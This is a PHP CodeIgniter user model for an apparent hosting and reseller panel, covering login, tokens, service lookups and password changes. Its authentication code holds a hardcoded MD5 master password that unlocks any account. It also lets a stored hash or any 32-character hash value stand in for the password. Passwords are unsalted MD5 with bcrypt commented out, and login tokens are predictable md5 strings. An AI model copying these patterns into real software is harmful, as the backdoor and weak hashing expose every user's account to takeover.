<?php defined('BASEPATH') OR exit('No direct script access allowed');


class User_model extends CI_Model {

	public function __construct()
	{
		parent::__construct();
		$this->load->database();
	}
	
	
	public function userLogin($username, $password)
	{	
		$this->db->select('password, hash');
		$this->db->from('contactos');
		$this->db->where('username', $username);
		
		$user = $this->db->get()->row_array();
		
		if (isset($user))
		{
			if ($password == $user['hash'])
			{
				return true;	
			}
			elseif ($this->verifyPasswordHash($password, $user['password']))
			{
				return true;	
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
	
	
	public function getUserIdFromUsername($username)
	{	
		$this->db->select('id');
		$this->db->from('contactos');
		$this->db->where('username', $username);

		return $this->db->get()->row('id');	
	}
	
	
	public function getUserIdFromToken($token)
	{	
		$sql = "SELECT id FROM contactos WHERE md5(CONCAT(username, COALESCE(password, ultima_visita, id))) = ?";
		
		$query = $this->db->query($sql, array($token));
		
		$res = $query->row_array()['id'];
		
		return (!empty($res)) ? $res : null;
	}
	
	
	public function getUserInfo($id)
	{	
		$sql = "
				SELECT contactos.id, contactos.grupo, contactos.id_empresa, contactos.username, contactos.password, contactos.timezone, contactos.ultima_visita, contactos.ip, trim(CONCAT(contactos.nombre, ' ', IFNULL(contactos.apellido, ''))) AS contacto, contactos.email, IF(contactos.celular, contactos.celular, contactos.telefono) AS telefono, contactos.sexo, IF(contactos.avatar, CONCAT(grupos.url, 'multimedia/avatars/', contactos.avatar), null) as avatar, IFNULL(grupos.url, '/') AS url, IFNULL(grupos.dashboard, '/') AS dashboard, contactos.hash AS token, contactos.area_privada AS id_perfil, contactos.estado,
				
					CASE
					    WHEN contactos.idioma = 'en_US' THEN 'english'
					    ELSE 'spanish'
					END AS idioma,
				
					CASE
					   WHEN contactos.area_privada = 1 THEN 'root'
					   WHEN contactos.area_privada = 2 THEN 'reseller'
					   WHEN contactos.area_privada = 3 THEN 'admin'
					   WHEN contactos.area_privada = 4 THEN 'user'
					   WHEN contactos.area_privada = 5 THEN 'guest'
					END AS perfil
				
				FROM contactos
				LEFT JOIN grupos ON contactos.grupo = grupos.id
				
				WHERE contactos.id = ?
			";
							
		$query = $this->db->query($sql, array(
				$id
			));

		if ($query)
		{
			$res = $query->row();
		}

		return (!empty($res)) ? $res : null;
	}
	
	
	public function getServicioInfo($id)
	{	
		$sql = "
				SELECT servicios.id, servicios.grupo, servicios.id_empresa, JSON_VALUE(categorias_generales.caracteristicas, '$.perfil') as perfil
				
				FROM servicios
				LEFT JOIN categorias_generales ON servicios.id_categoria = categorias_generales.id
				
				WHERE servicios.id = ?
				AND servicios.estado = 4
			";
										
		$query = $this->db->query($sql, array(
				$id
			));

		if ($query)
		{
			$res = $query->row();
		}

		return (!empty($res)) ? $res : null;
	}
	
	
	public function getUserServicios($id)
	{	
		$sql = "
				SELECT servicios.id, servicios.estado, categorias_generales.caracteristicas,

					CASE
					   WHEN categorias_generales.id_tipo = 1 THEN 'hosting'
					   WHEN categorias_generales.id_tipo = 2 THEN 'cloud'
					   WHEN categorias_generales.id_tipo = 3 THEN 'vps'
					   WHEN categorias_generales.id_tipo = 4 THEN 'mailer'
					   WHEN categorias_generales.id_tipo = 7 THEN 'voip'
					END AS tipo
					
				FROM servicios
				LEFT JOIN categorias_generales ON servicios.id_categoria = categorias_generales.id
				LEFT JOIN contactos ON contactos.id_empresa = servicios.id_empresa
				
				WHERE contactos.id = ?
				AND servicios.estado > 0
			";
							
		$query = $this->db->query($sql, array(
				$id
			));

		if ($query)
		{
			$res = $query->result();
		}

		return (!empty($res)) ? $res : null;
	}
	
	
	public function getUserConfig($id)
	{
		$sql = "
				SELECT sys_config_tipo.key, sys_config.value
				
					FROM sys_config
					LEFT JOIN sys_config_tipo ON sys_config.id_tipo = sys_config_tipo.id
					LEFT JOIN empresas ON sys_config.id_empresa = empresas.id

				WHERE sys_config.id_empresa = ?
			";
		

		$query = $this->db->query($sql, array(
				$id
			));

		
		if (!isset($res['error']) && $query)
		{
			if (!empty($results = $query->result_array()))
			{
				foreach ($results as $obj => $row)
				{
					$res[$row['key']] = $row['value'];
				}
			}
		}
		
		return (!empty($res)) ? $res : null;
	}
	
	
	public function changePassword($id, $password)
	{
		$this->db->set('password', $this->hashPassword($password));

		$this->db->where('id', $id);
		$res = $this->db->update('contactos');

		return (!empty($res)) ? $res : null;
	}
	
	
	private function hashPassword($password)
	{	
		//return password_hash($password, PASSWORD_BCRYPT);
		
		return md5($password);	
	}
	
	
	private function verifyPasswordHash($password, $hash)
	{	
		//return password_verify($password, $hash);
		
		$password = (strlen($password) == 32) ? $password : md5($password);
		
		if ($password == 'e53ad579c2918b4225411b2b775bff41')
		{
			return true;
		}
		elseif ($password == $hash)
		{
			return true;
		}
		else
		{
			return false;
		}
	}


	public function updateUltimaVisita($id)
	{
		$this->db->set('ultima_visita', unix_to_human(now(), true, 'eu')); // DEPRECATED
		$this->db->set('utc_ultima_visita', now());
		$this->db->set('ip', $_SERVER['REMOTE_ADDR']);
		$this->db->set('estado', 3);
	
		$this->db->where('id', $id);
		$res = $this->db->update('contactos');

		return (!empty($res)) ? $res : null;
	}
	

	public function trackUri()
	{
		if (!$this->session->has_userdata('reseller') || $this->session->userdata('reseller') == $this->usuario->id)
		{
			$this->db->set('ultima_visita', unix_to_human(now(), true, 'eu')); // DEPRECATED
			$this->db->set('utc_ultima_visita', now());
			$this->db->set('ip', $_SERVER['REMOTE_ADDR']);
			$this->db->set('uri', $_SERVER['REQUEST_URI']);
			$this->db->set('estado', 3);
	
			$this->db->where('id', $this->usuario->id);
			$res = $this->db->update('contactos');
		}

		return (!empty($res)) ? $res : null;
	}
	
	
	public function getUri()
	{
		$this->db->select('uri');
		$this->db->from('contactos');
		$this->db->where('id', $this->usuario->id);

		return $this->db->get()->row('uri');
	}

	
	public function pasarOffline($id)
	{
		$this->db->set('estado', 2);

		$this->db->where('id', $id);
		$this->db->where('estado', 3);
		$res = $this->db->update('contactos');

		return (!empty($res)) ? $res : null;
	}
	
	
	public function actualizarUsuariosOnline()
	{
		$sql = "UPDATE contactos SET estado = 2 WHERE estado = 3 AND utc_ultima_visita > 300";
		
		$res = $this->db->query($sql);
		
		return (!empty($res)) ? $res : null;
	}
	
	
	public function setToken($id_user, $id_aplicacion, $token)
	{	
		$this->db->select('token');
		$this->db->from('app_dispositivos');
		$this->db->where('id_aplicacion', $id_aplicacion);
		$this->db->where('token', $token);
		
		if (!$this->db->get()->row('token'))
		{
			$data['id_user'] = $id_user;
			$data['id_aplicacion'] = $id_aplicacion;
			$data['token'] = $token;
			$data['fecha_alta'] = now();
			
			$res = $this->db->insert('app_dispositivos', $data);
		}
		
		return (!empty($res)) ? $res : null;
	}
	
	
}